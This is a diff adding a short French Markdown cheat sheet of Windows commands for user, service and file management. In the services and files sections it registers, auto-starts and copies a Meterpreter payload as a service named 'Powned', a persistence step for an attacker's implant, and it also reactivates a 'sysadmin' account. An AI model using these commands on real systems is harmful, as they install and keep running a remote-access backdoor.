@@ -1,0 +1,36 @@
+# Ligne de commande Windows #
+##Gestion des utilisateurs##
+###activation d'un utilisateur###
+~~~~~~~
+net users sysadmin /active:yes
+~~~~~~~
+
+###désactivation d'un utilisateur###
+~~~~~~~
+net users sysadmin /active:no
+~~~~~~~
+
+##Gestion des services##
+~~~~~~~
+sc create Powned binPath= "C:\Meterpreter.exe"
+sc config Powned start= auto
+net start Powned
+sc delete Powned
+~~~~~~~
+
+
+##Gestion des fichiers##
+~~~~~~~
+xcopy Meterpreter.exe c:\
+~~~~~~~
+
+##Commandes utiles##
+
++--------------+-------------------------------------------+
+| Commande     |  Description                              |
++==============+===========================================+
+| regedit      | Ouvre l'éditeur de registre               |
+| services.msc | Ouvre le gestionnaire de services         |
+| secpol.msc   | Ouvre les paramètres de sécurités locales |
+| inetcpl.cpl  | Editeur d'option internet                 |
++--------------+-------------------------------------------+
